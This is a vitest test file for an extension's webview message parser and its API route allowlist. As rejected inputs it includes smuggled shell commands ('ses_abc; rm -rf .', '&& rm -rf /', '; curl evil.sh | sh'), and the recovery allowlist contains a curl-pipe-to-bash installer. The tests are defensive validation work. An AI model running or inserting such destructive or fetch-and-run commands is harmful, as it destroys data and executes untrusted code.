/* oxlint-disable anti-slop/no-unsafe-dictionary-type, anti-slop/require-safety-comment-for-type-assertion -- SAFETY: These tests deliberately pass open, malformed webview payloads through the parser. */
import { describe, expect, it } from 'vitest';
import type { WebviewMessage } from '../../shared/protocol';
import {
  WEBVIEW_MESSAGE_TYPES,
  isAllowedApiRequest,
  isAllowedExternalUrl,
  parseWebviewMessage,
} from './webview-message';
import { VALID_WEBVIEW_MESSAGES } from './webview-message.test-support';

function parseQueuedMessageUpdate(messages: unknown[]) {
  return parseWebviewMessage({ type: 'queued-messages/update', payload: { messages } });
}

function createRalphConfig() {
  return {
    managerSessionId: 'manager-1',
    workspaceDirectory: '/workspace',
    planDocPath: 'RALPH.md',
    iterations: 5,
    promptTemplate: 'Follow the plan',
    permissionMode: 'full',
    model: { providerID: 'openai', modelID: 'gpt-5', variant: 'high' },
    agent: null,
    createdAt: 100,
  };
}

function createRalphRun() {
  return {
    config: createRalphConfig(),
    status: 'paused',
    currentIteration: 1,
    iterations: [
      {
        index: 1,
        childSessionId: 'child-1',
        status: 'passed',
        phase: 'verification',
        startedAt: 101,
        endedAt: 102,
        filesChanged: ['src/app.ts'],
        verification: { lint: 'pass', test: 'skipped' },
        tokens: {
          input: 1,
          output: 2,
          reasoning: 3,
          cacheRead: 4,
          cacheWrite: 5,
          total: 6,
        },
        cost: 0.1,
        note: 'Implemented the next item.',
        repairSessionIds: ['repair-1'],
      },
    ],
    updatedAt: 103,
  };
}

describe('webview message validation', () => {
  it('requires complete model preference update snapshots', () => {
    const preferences = {
      modelVariantSelections: {},
      hiddenProviders: [],
      hiddenModels: [],
      addedModels: [],
      pinnedModels: [],
      modelDisplayNames: {},
    };

    expect(
      parseWebviewMessage({
        type: 'model-preferences/update',
        payload: { base: preferences, preferences: { ...preferences, pinnedModels: ['a:m'] } },
      })
    ).toEqual({
      type: 'model-preferences/update',
      payload: { base: preferences, preferences: { ...preferences, pinnedModels: ['a:m'] } },
    });
    expect(
      parseWebviewMessage({
        type: 'model-preferences/update',
        payload: { base: preferences, preferences: { pinnedModels: ['a:m'] } },
      })
    ).toBeNull();
  });

  it('parses session read acknowledgements', () => {
    expect(
      parseWebviewMessage({ type: 'session/seen', payload: { sessionId: 'session-1' } })
    ).toEqual({ type: 'session/seen', payload: { sessionId: 'session-1' } });
    expect(parseWebviewMessage({ type: 'session/seen', payload: { sessionId: '' } })).toBeNull();
  });

  it('parses consumed interrupted-session recovery acknowledgements', () => {
    expect(
      parseWebviewMessage({
        type: 'recovery/interrupted-sessions-ack',
        payload: {
          claimId: 4,
          consumedSessionIds: ['session-1', 'session-1', 'session-2'],
        },
      })
    ).toEqual({
      type: 'recovery/interrupted-sessions-ack',
      payload: { claimId: 4, consumedSessionIds: ['session-1', 'session-2'] },
    });
    expect(
      parseWebviewMessage({
        type: 'recovery/interrupted-sessions-ack',
        payload: { claimId: 4 },
      })
    ).toBeNull();
  });

  it('parses restart, force restart, and restart checks', () => {
    expect(parseWebviewMessage({ type: 'server/restart' })).toEqual({
      type: 'server/restart',
    });
    expect(parseWebviewMessage({ type: 'server/restart', payload: { force: true } })).toEqual({
      type: 'server/restart',
      payload: { force: true },
    });
    expect(parseWebviewMessage({ type: 'server/restart/check', payload: { checkId: 4 } })).toEqual({
      type: 'server/restart/check',
      payload: { checkId: 4 },
    });
    expect(parseWebviewMessage({ type: 'server/restart/check' })).toBeNull();
  });

  it('accepts safe OpenCode session ids and rejects shell input', () => {
    expect(
      parseWebviewMessage({
        type: 'session/open-in-opencode',
        payload: { sessionId: 'ses_abc-123' },
      })
    ).toEqual({
      type: 'session/open-in-opencode',
      payload: { sessionId: 'ses_abc-123' },
    });
    expect(
      parseWebviewMessage({
        type: 'session/open-in-opencode',
        payload: { sessionId: 'ses_abc; rm -rf .' },
      })
    ).toBeNull();
  });

  it('accepts safe sidebar session ids and rejects shell input', () => {
    expect(
      parseWebviewMessage({
        type: 'session/open-in-sidebar',
        payload: { sessionId: 'ses_abc-123' },
      })
    ).toEqual({
      type: 'session/open-in-sidebar',
      payload: { sessionId: 'ses_abc-123' },
    });
    expect(
      parseWebviewMessage({
        type: 'session/open-in-sidebar',
        payload: { sessionId: 'ses_abc; rm -rf .' },
      })
    ).toBeNull();
  });

  it('accepts known API routes used by the webview client', () => {
    expect(isAllowedApiRequest('GET', '/command')).toBe(true);
    expect(isAllowedApiRequest('GET', '/session')).toBe(true);
    expect(isAllowedApiRequest('GET', '/session?limit=100')).toBe(true);
    expect(isAllowedApiRequest('GET', '/session?limit=30&search=dark+mode&roots=true')).toBe(true);
    expect(isAllowedApiRequest('POST', '/session?directory=%2Frepo-a')).toBe(true);
    expect(isAllowedApiRequest('POST', '/session/abc/init')).toBe(true);
    expect(isAllowedApiRequest('POST', '/session/abc/prompt_async')).toBe(true);
    expect(isAllowedApiRequest('POST', '/session/abc/prompt_async?directory=%2Frepo-a')).toBe(true);
    expect(isAllowedApiRequest('POST', '/session/abc/command')).toBe(true);
    expect(isAllowedApiRequest('POST', '/session/abc/fork')).toBe(true);
    expect(isAllowedApiRequest('POST', '/session/abc/share')).toBe(true);
    expect(isAllowedApiRequest('DELETE', '/session/abc/share')).toBe(true);
    expect(isAllowedApiRequest('DELETE', '/session/abc/share?directory=%2Frepo-a')).toBe(true);
    expect(isAllowedApiRequest('GET', '/session/abc/diff?messageID=msg-1')).toBe(true);
    expect(isAllowedApiRequest('GET', '/session/abc/message')).toBe(true);
    expect(isAllowedApiRequest('GET', '/session/abc/message?limit=200')).toBe(true);
    expect(isAllowedApiRequest('GET', '/session/abc/message?limit=200&before=cursor-2')).toBe(true);
    expect(isAllowedApiRequest('DELETE', '/session/abc/message/message-1')).toBe(true);
    expect(isAllowedApiRequest('GET', '/session/abc/todo')).toBe(true);
    expect(isAllowedApiRequest('POST', '/session/abc/unrevert')).toBe(true);
    expect(isAllowedApiRequest('POST', '/question/request-1/reply')).toBe(true);
    expect(isAllowedApiRequest('GET', '/permission')).toBe(true);
    expect(isAllowedApiRequest('POST', '/permission/request-1/reply')).toBe(true);
    expect(isAllowedApiRequest('GET', '/varro/provider-limit?providerID=openai')).toBe(true);
    expect(isAllowedApiRequest('GET', '/varro/workspace-file?path=package.json')).toBe(true);
    expect(isAllowedApiRequest('GET', '/varro/workspace-path/resolve?path=package.json')).toBe(
      true
    );
    expect(isAllowedApiRequest('GET', '/varro/workspace-file/pick')).toBe(true);
    expect(isAllowedApiRequest('GET', '/varro/opencode-config')).toBe(true);
    expect(isAllowedApiRequest('POST', '/varro/opencode-config/model-routing')).toBe(true);
    expect(isAllowedApiRequest('GET', '/varro/opencode-config/permissions')).toBe(true);
    expect(isAllowedApiRequest('POST', '/varro/opencode-config/permissions')).toBe(true);
    expect(isAllowedApiRequest('GET', '/varro/permission/session-rules?sessionId=session-1')).toBe(
      true
    );
    expect(isAllowedApiRequest('POST', '/varro/permission/session-rules')).toBe(true);
    expect(isAllowedApiRequest('GET', '/varro/permission/server-memory?sessionId=session-1')).toBe(
      true
    );
    expect(isAllowedApiRequest('GET', '/varro/permission/server-memory')).toBe(true);
    expect(isAllowedApiRequest('DELETE', '/varro/permission/server-memory')).toBe(true);
    expect(isAllowedApiRequest('POST', '/varro/permission/judge')).toBe(true);
    expect(isAllowedApiRequest('POST', '/varro/permission/project-allow?directory=%2Frepo-a')).toBe(
      true
    );
    expect(isAllowedApiRequest('POST', '/varro/permission/session-allow?directory=%2Frepo-a')).toBe(
      true
    );
    expect(
      isAllowedApiRequest(
        'GET',
        '/varro/permission/judge/model?providerID=openai&modelID=gpt-5.6&variant=low'
      )
    ).toBe(true);
    expect(isAllowedApiRequest('GET', '/varro/session/session-1/diff-summary')).toBe(true);
    expect(isAllowedApiRequest('POST', '/varro/session/session-1/pin')).toBe(true);
    expect(isAllowedApiRequest('POST', '/varro/session/session-1/rename-if-untitled')).toBe(true);
    expect(isAllowedApiRequest('DELETE', '/varro/session/session-1/delete')).toBe(true);
    expect(isAllowedApiRequest('GET', '/varro/session-trash')).toBe(true);
    expect(isAllowedApiRequest('POST', '/varro/session-trash/session-1/restore')).toBe(true);
    expect(isAllowedApiRequest('DELETE', '/varro/session-trash/session-1/delete')).toBe(true);
    expect(isAllowedApiRequest('DELETE', '/varro/session-trash')).toBe(true);
    expect(isAllowedApiRequest('POST', '/varro/plan/open')).toBe(true);
    expect(isAllowedApiRequest('GET', '/mcp')).toBe(true);
    expect(isAllowedApiRequest('GET', '/lsp')).toBe(true);
    expect(isAllowedApiRequest('POST', '/mcp/browser-bridge/connect')).toBe(true);
    expect(isAllowedApiRequest('POST', '/mcp/browser-bridge/disconnect')).toBe(true);
    expect(isAllowedApiRequest('POST', '/mcp/browser-bridge/auth/authenticate')).toBe(true);
    expect(isAllowedApiRequest('POST', '/mcp/browser-bridge/auth')).toBe(true);
    expect(isAllowedApiRequest('POST', '/mcp/browser-bridge/auth/callback')).toBe(true);
    expect(isAllowedApiRequest('DELETE', '/mcp/browser-bridge/auth')).toBe(true);
    expect(isAllowedApiRequest('GET', '/provider/auth')).toBe(true);
    expect(isAllowedApiRequest('GET', '/provider')).toBe(true);
    expect(isAllowedApiRequest('PUT', '/auth/openai')).toBe(true);
    expect(isAllowedApiRequest('DELETE', '/auth/openai')).toBe(true);
    expect(isAllowedApiRequest('GET', '/vcs/status')).toBe(true);
    expect(isAllowedApiRequest('POST', '/provider/openai/oauth/authorize')).toBe(true);
    expect(isAllowedApiRequest('POST', '/provider/openai/oauth/callback')).toBe(true);
    expect(isAllowedApiRequest('GET', '/experimental/workspace/status')).toBe(true);
    expect(isAllowedApiRequest('POST', '/experimental/workspace/warp')).toBe(true);
    expect(isAllowedApiRequest('GET', '/global/config')).toBe(true);
    expect(isAllowedApiRequest('GET', '/model/default')).toBe(true);
  });

  it('allows only the exact MCP OAuth lifecycle methods without query parameters', () => {
    expect(isAllowedApiRequest('GET', '/mcp/browser-bridge/auth')).toBe(false);
    expect(isAllowedApiRequest('DELETE', '/mcp/browser-bridge/auth/callback')).toBe(false);
    expect(isAllowedApiRequest('POST', '/mcp/browser-bridge/auth?directory=/repo')).toBe(false);
    expect(isAllowedApiRequest('POST', '/mcp/browser-bridge/auth/callback?code=secret')).toBe(
      false
    );
    expect(isAllowedApiRequest('DELETE', '/mcp/browser-bridge/auth?force=true')).toBe(false);
    expect(isAllowedApiRequest('POST', '/mcp/browser-bridge/auth/extra')).toBe(false);
  });

  it('rejects invalid session page limits', () => {
    expect(isAllowedApiRequest('GET', '/session?limit=0')).toBe(false);
    expect(isAllowedApiRequest('GET', '/session?limit=-1')).toBe(false);
    expect(isAllowedApiRequest('GET', '/session?limit=all')).toBe(false);
    expect(isAllowedApiRequest('GET', '/session?limit=100&limit=200')).toBe(false);
    expect(isAllowedApiRequest('GET', '/session?limit=100&start=0')).toBe(false);
    expect(isAllowedApiRequest('GET', '/session?limit=1000001')).toBe(false);
  });

  it('rejects malformed native session searches', () => {
    expect(isAllowedApiRequest('GET', '/session?limit=30&search=&roots=true')).toBe(false);
    expect(isAllowedApiRequest('GET', '/session?limit=30&search=dark')).toBe(false);
    expect(isAllowedApiRequest('GET', '/session?limit=30&search=dark&roots=false')).toBe(false);
    expect(isAllowedApiRequest('GET', '/session?limit=30&search=dark&roots=true&roots=true')).toBe(
      false
    );
    expect(isAllowedApiRequest('GET', '/session?limit=30&search=dark&search=mode&roots=true')).toBe(
      false
    );
    expect(isAllowedApiRequest('GET', '/session?limit=30&search=dark&roots=true&start=0')).toBe(
      false
    );
  });

  it('rejects absolute and unsupported API routes', () => {
    expect(isAllowedApiRequest('GET', 'https://example.com/session')).toBe(false);
    expect(isAllowedApiRequest('GET', '//example.com/session')).toBe(false);
    expect(isAllowedApiRequest('GET', '/experimental/console')).toBe(false);
    expect(isAllowedApiRequest('GET', '/file/status')).toBe(false);
    expect(isAllowedApiRequest('POST', '/session?directory=')).toBe(false);
    expect(isAllowedApiRequest('POST', '/session?directory=%2Fa&directory=%2Fb')).toBe(false);
    expect(isAllowedApiRequest('POST', '/session?directory=%2Fa&extra=1')).toBe(false);
    expect(isAllowedApiRequest('POST', '/session/abc/abort?directory=%2Frepo-a')).toBe(true);
    expect(isAllowedApiRequest('GET', '/session/abc/share')).toBe(false);
    expect(isAllowedApiRequest('POST', '/session/abc/share?directory=')).toBe(false);
    expect(isAllowedApiRequest('DELETE', '/session/abc/share?extra=1')).toBe(false);
    expect(isAllowedApiRequest('DELETE', '/config/providers')).toBe(false);
    expect(isAllowedApiRequest('POST', '/model/default')).toBe(false);
    expect(isAllowedApiRequest('GET', '/model/default?directory=%2Frepo')).toBe(false);
    expect(isAllowedApiRequest('GET', '/permission?directory=%2Frepo')).toBe(false);
    expect(isAllowedApiRequest('GET', '/question?directory=%2Frepo')).toBe(false);
    expect(isAllowedApiRequest('GET', '/model/default/extra')).toBe(false);
    expect(isAllowedApiRequest('GET', '/session/abc/diff?messageID=1&extra=1')).toBe(false);
    expect(isAllowedApiRequest('GET', '/session/abc/message?limit=5&extra=1')).toBe(false);
    expect(isAllowedApiRequest('GET', '/session/abc/message?before=cursor-2')).toBe(false);
    expect(isAllowedApiRequest('POST', '/session/abc/message?limit=5')).toBe(false);
    expect(isAllowedApiRequest('GET', '/session/abc/message/message-1')).toBe(false);
    expect(isAllowedApiRequest('GET', '/varro/provider-limit?modelID=gpt')).toBe(false);
    expect(isAllowedApiRequest('GET', '/varro/workspace-file')).toBe(false);
    expect(
      isAllowedApiRequest('GET', '/varro/workspace-file?path=package.json&directory=%2Frepo')
    ).toBe(false);
    expect(isAllowedApiRequest('GET', '/varro/workspace-path/resolve')).toBe(false);
    expect(isAllowedApiRequest('POST', '/varro/opencode-config')).toBe(false);
    expect(isAllowedApiRequest('GET', '/varro/opencode-config/model-routing')).toBe(false);
    expect(isAllowedApiRequest('GET', '/varro/permission/judge')).toBe(false);
    expect(isAllowedApiRequest('POST', '/varro/session/session-1/diff-summary')).toBe(false);
    expect(isAllowedApiRequest('GET', '/varro/session/session-1/pin')).toBe(false);
    expect(isAllowedApiRequest('GET', '/varro/session/session-1/diff-summary?messageID=1')).toBe(
      false
    );
    expect(isAllowedApiRequest('GET', '/varro/session/session-1/diff-summary/extra')).toBe(false);
    expect(isAllowedApiRequest('GET', '/varro/session/session-1/rename-if-untitled')).toBe(false);
    expect(isAllowedApiRequest('GET', '/varro/plan/open')).toBe(false);
    expect(isAllowedApiRequest('POST', '/varro/session/session-1/delete')).toBe(false);
    expect(isAllowedApiRequest('POST', '/varro/session-trash/session-1/delete')).toBe(false);
    expect(isAllowedApiRequest('DELETE', '/varro/session-trash/session-1/restore')).toBe(false);
    expect(isAllowedApiRequest('GET', '/provider/openai/oauth/authorize')).toBe(false);
    expect(isAllowedApiRequest('POST', '/provider')).toBe(false);
    expect(isAllowedApiRequest('POST', '/auth/openai')).toBe(false);
    expect(isAllowedApiRequest('DELETE', '/auth/openai?force=true')).toBe(false);
    expect(isAllowedApiRequest('POST', '/session/session-1/permissions/perm-1')).toBe(false);
  });

  it('preserves route precedence so specific patterns shadow param patterns', () => {
    // `/session/status` must resolve via its own route, not the `/session/:id`
    // catch-all, so a non-GET method is rejected rather than treated as a session id.
    expect(isAllowedApiRequest('GET', '/session/status')).toBe(true);
    expect(isAllowedApiRequest('DELETE', '/session/status')).toBe(false);
    expect(isAllowedApiRequest('GET', '/session/abc')).toBe(true);
    expect(isAllowedApiRequest('DELETE', '/session/abc')).toBe(true);

    // `/session/:id/diff` is GET-only and must not fall through to the POST action list.
    expect(isAllowedApiRequest('POST', '/session/abc/diff')).toBe(false);
    expect(isAllowedApiRequest('POST', '/session/abc/not-an-action')).toBe(false);

    // Action enums on param routes only accept their whitelisted final segment.
    expect(isAllowedApiRequest('POST', '/mcp/server/connect')).toBe(true);
    expect(isAllowedApiRequest('POST', '/mcp/server/restart')).toBe(false);
    expect(isAllowedApiRequest('POST', '/question/req/reject')).toBe(true);
    expect(isAllowedApiRequest('POST', '/question/req/approve')).toBe(false);

    // Deeper-than-known session paths have no matching route.
    expect(isAllowedApiRequest('GET', '/session/abc/message/extra')).toBe(false);
  });

  it('rejects unsafe extension-host actions from malformed messages', () => {
    expect(
      parseWebviewMessage({
        type: 'terminal/run',
        payload: { command: 'rm -rf .', title: 'Nope' },
      })
    ).toBeNull();

    expect(
      parseWebviewMessage({
        type: 'vscode/open-external',
        payload: { url: 'command:workbench.action.reloadWindow' },
      })
    ).toBeNull();

    expect(
      parseWebviewMessage({
        type: 'api/request',
        payload: { id: 1, method: 'GET', path: 'https://example.com/' },
      })
    ).toBeNull();

    // Unknown languages would be handed straight to setTextDocumentLanguage.
    expect(
      parseWebviewMessage({
        type: 'vscode/open-text',
        payload: { content: 'x', title: 'tool', language: 'javascript' },
      })
    ).toBeNull();

    expect(parseWebviewMessage({ type: 'vscode/open-text', payload: { content: 'x' } })).toBeNull();

    expect(
      parseWebviewMessage({
        type: 'vscode/open-text',
        payload: { content: 'x'.repeat(2_000_001), title: 'tool' },
      })
    ).toBeNull();

    expect(
      parseWebviewMessage({
        type: 'vscode/open-external',
        payload: { url: 'http://example.com' },
      })
    ).toBeNull();

    expect(
      parseWebviewMessage({
        type: 'terminal/run',
        payload: { command: 'opencode auth', title: 'Auth' },
      })
    ).toEqual({
      type: 'terminal/run',
      payload: { command: 'opencode auth', title: 'Auth' },
    });

    expect(
      parseWebviewMessage({
        type: 'terminal/run',
        payload: { command: 'opencode providers logout', title: 'Provider Logout' },
      })
    ).toEqual({
      type: 'terminal/run',
      payload: { command: 'opencode providers logout', title: 'Provider Logout' },
    });
  });

  // The server-status recovery buttons post these; when the allowlist did not
  // cover them the buttons silently did nothing in production while component
  // and e2e tests - which never run this parser - kept passing.
  it.each([
    'npm i -g opencode-ai',
    'opencode upgrade',
    'npm install -g opencode-ai@latest',
    'pnpm add -g opencode-ai@latest',
    'yarn global add opencode-ai@latest',
    'bun add -g opencode-ai@latest',
    'brew upgrade opencode',
    'curl -fsSL https://opencode.ai/install | bash',
  ])('accepts the recovery command %s', (command) => {
    expect(parseWebviewMessage({ type: 'terminal/run', payload: { command } })).toEqual({
      type: 'terminal/run',
      payload: { command },
    });
  });

  it('still rejects commands Varro never authored', () => {
    for (const command of [
      'npm i -g opencode-ai && rm -rf /',
      'brew upgrade opencode; curl evil.sh | sh',
      'npm i -g opencode-ai ',
      'echo hi',
    ]) {
      expect(parseWebviewMessage({ type: 'terminal/run', payload: { command } })).toBeNull();
    }
  });

  it('allows only https external URLs', () => {
    expect(isAllowedExternalUrl('https://example.com')).toBe(true);
    expect(isAllowedExternalUrl('http://example.com')).toBe(false);
  });

  it('accepts tool text destined for an editor tab, including empty output', () => {
    expect(
      parseWebviewMessage({
        type: 'vscode/open-text',
        payload: { content: 'line one\nline two', title: 'rtk git status (output)' },
      })
    ).toEqual({
      type: 'vscode/open-text',
      payload: { content: 'line one\nline two', title: 'rtk git status (output)' },
    });

    // A completed tool with no output is still worth opening.
    expect(
      parseWebviewMessage({
        type: 'vscode/open-text',
        payload: { content: '', title: 'tool', language: 'shellscript' },
      })
    ).toEqual({
      type: 'vscode/open-text',
      payload: { content: '', title: 'tool', language: 'shellscript' },
    });

    expect(
      parseWebviewMessage({
        type: 'vscode/open-text',
        payload: { content: 'failed', title: 'Edit error', language: 'plaintext' },
      })
    ).toEqual({
      type: 'vscode/open-text',
      payload: { content: 'failed', title: 'Edit error', language: 'plaintext' },
    });

    expect(
      parseWebviewMessage({
        type: 'vscode/open-text',
        payload: {
          content: '# Findings',
          title: 'Review implementation (task_result)',
          view: 'markdown-preview',
        },
      })
    ).toEqual({
      type: 'vscode/open-text',
      payload: {
        content: '# Findings',
        title: 'Review implementation (task_result)',
        view: 'markdown-preview',
      },
    });

    expect(
      parseWebviewMessage({
        type: 'vscode/open-text',
        payload: { content: '# Findings', title: 'Result', view: 'side-by-side' },
      })
    ).toBeNull();

    expect(
      parseWebviewMessage({
        type: 'vscode/open-text',
        payload: { content: '<svg />', title: 'SVG user message', language: 'xml' },
      })
    ).toEqual({
      type: 'vscode/open-text',
      payload: { content: '<svg />', title: 'SVG user message', language: 'xml' },
    });
  });

  it('normalizes accepted API request methods to uppercase', () => {
    expect(
      parseWebviewMessage({
        type: 'api/request',
        payload: { id: 1, method: 'get', path: '/session' },
      })
    ).toEqual({ type: 'api/request', payload: { id: 1, method: 'GET', path: '/session' } });
  });

  it('validates permission automation lease metadata on API requests', () => {
    expect(
      parseWebviewMessage({
        type: 'api/request',
        payload: {
          id: 1,
          method: 'POST',
          path: '/permission/perm-1/reply',
          permissionAutomationLease: 4,
          permissionAutomationSessionID: 'session-1',
        },
      })
    ).toEqual({
      type: 'api/request',
      payload: {
        id: 1,
        method: 'POST',
        path: '/permission/perm-1/reply',
        permissionAutomationLease: 4,
        permissionAutomationSessionID: 'session-1',
      },
    });
    expect(
      parseWebviewMessage({
        type: 'api/request',
        payload: {
          id: 1,
          method: 'POST',
          path: '/permission/perm-1/reply',
          permissionAutomationLease: -1,
        },
      })
    ).toBeNull();
    expect(
      parseWebviewMessage({
        type: 'api/request',
        payload: {
          id: 1,
          method: 'POST',
          path: '/permission/perm-1/reply',
          permissionAutomationSessionID: 'session-1',
        },
      })
    ).toBeNull();
    for (const sessionID of ['', '__proto__', 'x'.repeat(513)]) {
      expect(
        parseWebviewMessage({
          type: 'api/request',
          payload: {
            id: 1,
            method: 'POST',
            path: '/permission/perm-1/reply',
            permissionAutomationLease: 4,
            permissionAutomationSessionID: sessionID,
          },
        })
      ).toBeNull();
    }
  });

  it('validates API cancellation keys', () => {
    expect(
      parseWebviewMessage({
        type: 'api/request',
        payload: { id: 1, cancelKey: 'request-token', method: 'GET', path: '/session' },
      })
    ).toEqual({
      type: 'api/request',
      payload: { id: 1, cancelKey: 'request-token', method: 'GET', path: '/session' },
    });
    expect(
      parseWebviewMessage({
        type: 'api/cancel',
        payload: { id: 1, cancelKey: 'request-token' },
      })
    ).toEqual({ type: 'api/cancel', payload: { id: 1, cancelKey: 'request-token' } });
    expect(
      parseWebviewMessage({ type: 'api/cancel', payload: { id: 1, cancelKey: '' } })
    ).toBeNull();
  });

  it('sanitizes bounded JSON-compatible API request bodies', () => {
    const body = {
      parts: [{ type: 'text', text: 'Implement the next item' }],
      model: { providerID: 'openai', modelID: 'gpt-5' },
      noReply: false,
      metadata: null,
      variant: undefined,
    };

    const parsed = parseWebviewMessage({
      type: 'api/request',
      payload: { id: 1, method: 'POST', path: '/session/session-1/prompt_async', body },
    });

    expect(parsed).toEqual({
      type: 'api/request',
      payload: { id: 1, method: 'POST', path: '/session/session-1/prompt_async', body },
    });
    if (parsed?.type === 'api/request') {
      expect(parsed.payload.body).not.toBe(body);
      expect(Object.hasOwn(parsed.payload.body as object, 'variant')).toBe(false);
    }
  });

  it('accepts only the true interrupted recovery marker', () => {
    expect(
      parseWebviewMessage({
        type: 'api/request',
        payload: {
          id: 1,
          method: 'POST',
          path: '/session/session-1/prompt_async',
          interruptedRecovery: true,
          body: { parts: [] },
        },
      })
    ).toEqual({
      type: 'api/request',
      payload: {
        id: 1,
        method: 'POST',
        path: '/session/session-1/prompt_async',
        interruptedRecovery: true,
        body: { parts: [] },
      },
    });
    expect(
      parseWebviewMessage({
        type: 'api/request',
        payload: {
          id: 2,
          method: 'POST',
          path: '/session/session-1/prompt_async',
          interruptedRecovery: false,
        },
      })
    ).toBeNull();
  });

  it('accepts only structurally valid native PDF prompt and queue payloads', () => {
    const pdf = {
      id: 'pdf-1',
      url: 'data:application/pdf;base64,JVBERi0xCg==',
      mime: 'application/pdf',
      filename: 'spec.pdf',
      size: 7,
    };
    expect(
      parseWebviewMessage({
        type: 'api/request',
        payload: {
          id: 1,
          method: 'POST',
          path: '/session/session-1/prompt_async',
          body: { parts: [{ type: 'file', mime: pdf.mime, filename: pdf.filename, url: pdf.url }] },
        },
      })
    ).not.toBeNull();
    expect(
      parseWebviewMessage({
        type: 'queued-messages/update',
        payload: {
          messages: [
            {
              id: 'queue-1',
              sessionId: 'session-1',
              text: '',
              droppedFiles: [],
              clipboardImages: [],
              nativePdfs: [pdf],
              terminalSelection: null,
            },
          ],
        },
      })
    ).not.toBeNull();
    expect(
      parseWebviewMessage({
        type: 'api/request',
        payload: {
          id: 2,
          method: 'POST',
          path: '/session/session-1/prompt_async',
          body: {
            parts: [
              {
                type: 'file',
                mime: 'application/pdf',
                filename: 'fake.pdf',
                url: 'data:application/pdf;base64,bm90IGEgcGRm',
              },
            ],
          },
        },
      })
    ).toBeNull();
  });

  it('rejects malformed queued message routing records atomically', () => {
    const valid = {
      id: 'queue-1',
      messageId: 'message-1',
      sessionId: 'session-1',
      text: '',
      agent: 'build',
      paused: false,
      droppedFiles: [],
      clipboardImages: [],
      terminalSelection: null,
    };
    expect(parseQueuedMessageUpdate([valid])).not.toBeNull();
    expect(parseQueuedMessageUpdate([valid, {}])).toBeNull();
    for (const field of ['id', 'sessionId', 'text'] as const) {
      const malformed: Partial<typeof valid> = { ...valid };
      delete malformed[field];
      expect(parseQueuedMessageUpdate([malformed])).toBeNull();
    }
    for (const unsafe of ['__proto__', 'constructor', 'prototype', 'x'.repeat(513)]) {
      expect(parseQueuedMessageUpdate([{ ...valid, id: unsafe }])).toBeNull();
      expect(parseQueuedMessageUpdate([{ ...valid, sessionId: unsafe }])).toBeNull();
      expect(parseQueuedMessageUpdate([{ ...valid, messageId: unsafe }])).toBeNull();
      expect(parseQueuedMessageUpdate([{ ...valid, ownerViewId: unsafe }])).toBeNull();
    }
    expect(parseQueuedMessageUpdate([{ ...valid, agent: 'x'.repeat(513) }])).toBeNull();
    expect(parseQueuedMessageUpdate([{ ...valid, paused: 'false' }])).toBeNull();
    expect(
      parseQueuedMessageUpdate([{ ...valid, queuedContext: { visionDelegationAvailable: 'yes' } }])
    ).toBeNull();
    expect(
      parseQueuedMessageUpdate([{ ...valid, text: 'x'.repeat(8 * 1024 * 1024 + 1) }])
    ).toBeNull();
  });

  it('validates manual queued-message dispatch claims', () => {
    const claim = {
      type: 'queued-messages/claim',
      payload: {
        requestId: 1,
        itemId: 'queue-1',
        sessionId: 'session-1',
        mode: 'steer',
      },
    } as const;

    expect(parseWebviewMessage(claim)).toEqual(claim);
    expect(
      parseWebviewMessage({ ...claim, payload: { ...claim.payload, mode: 'invalid' } })
    ).toBeNull();
  });

  it('validates session permission mode updates', () => {
    expect(
      parseWebviewMessage({
        type: 'permission-mode/update',
        payload: { sessionId: 'session-1', mode: 'full' },
      })
    ).toEqual({
      type: 'permission-mode/update',
      payload: { sessionId: 'session-1', mode: 'full' },
    });
    expect(
      parseWebviewMessage({
        type: 'permission-mode/update',
        payload: { sessionId: 'session-1', mode: 'invalid' },
      })
    ).toBeNull();
  });

  it('parses legacy permission mode migrations', () => {
    expect(
      parseWebviewMessage({
        type: 'permission-modes/migrate',
        payload: { modes: { 'session-1': 'auto' } },
      })
    ).toEqual({
      type: 'permission-modes/migrate',
      payload: { modes: { 'session-1': 'auto' } },
    });
  });

  it.each(['__proto__', 'constructor', 'prototype', 'x'.repeat(513)])(
    'rejects unsafe persisted session ID %s',
    (sessionId) => {
      const model = { providerID: 'openai', modelID: 'gpt-5.6-sol' };
      expect(
        parseWebviewMessage({
          type: 'permission-mode/update',
          payload: { sessionId, mode: 'full' },
        })
      ).toBeNull();
      expect(
        parseWebviewMessage({
          type: 'permission-modes/migrate',
          payload: { modes: { [sessionId]: 'auto' } },
        })
      ).toBeNull();
      expect(
        parseWebviewMessage({
          type: 'session-model/update',
          payload: { sessionId, model },
        })
      ).toBeNull();
      expect(
        parseWebviewMessage({
          type: 'session-models/migrate',
          payload: { models: { [sessionId]: model } },
        })
      ).toBeNull();
    }
  );

  it('validates session model updates with reasoning variants', () => {
    expect(
      parseWebviewMessage({
        type: 'session-model/update',
        payload: {
          sessionId: 'session-1',
          model: { providerID: 'openai', modelID: 'gpt-5.6-sol', variant: 'xhigh' },
        },
      })
    ).toEqual({
      type: 'session-model/update',
      payload: {
        sessionId: 'session-1',
        model: { providerID: 'openai', modelID: 'gpt-5.6-sol', variant: 'xhigh' },
      },
    });
    expect(
      parseWebviewMessage({
        type: 'session-model/update',
        payload: { sessionId: 'session-1', model: { providerID: 'openai', modelID: 1 } },
      })
    ).toBeNull();
  });

  it('preserves a session model variant when opening an editor', () => {
    expect(
      parseWebviewMessage({
        type: 'session/open-in-editor',
        payload: {
          sessionId: 'session-1',
          title: 'Session 1',
          model: { providerID: 'openai', modelID: 'gpt-5.6-sol', variant: 'xhigh' },
        },
      })
    ).toEqual({
      type: 'session/open-in-editor',
      payload: {
        sessionId: 'session-1',
        title: 'Session 1',
        model: { providerID: 'openai', modelID: 'gpt-5.6-sol', variant: 'xhigh' },
      },
    });
  });

  it('rejects unsafe or structurally excessive API request bodies', () => {
    const cyclic: Record<string, unknown> = {};
    cyclic.self = cyclic;
    const deep: Record<string, unknown> = {};
    let cursor = deep;
    for (let index = 0; index < 30; index += 1) {
      const next: Record<string, unknown> = {};
      cursor.next = next;
      cursor = next;
    }
    const tooLongString = 'x'.repeat(8 * 1024 * 1024 + 1);

    const invalidBodies: unknown[] = [
      cyclic,
      deep,
      { value: () => true },
      { value: Symbol('nope') },
      { value: 1n },
      { value: Number.NaN },
      Array.from({ length: 5_001 }, () => null),
      Array.from({ length: 4_500 }, () => ({ first: 1, second: 2 })),
      { value: tooLongString },
      Object.defineProperty({}, 'hidden', { value: true }),
      { [Symbol('key')]: true },
    ];

    for (const body of invalidBodies) {
      expect(
        parseWebviewMessage({
          type: 'api/request',
          payload: { id: 1, method: 'POST', path: '/session', body },
        })
      ).toBeNull();
    }
  });

  it('accepts a request to open filtered VS Code settings', () => {
    expect(
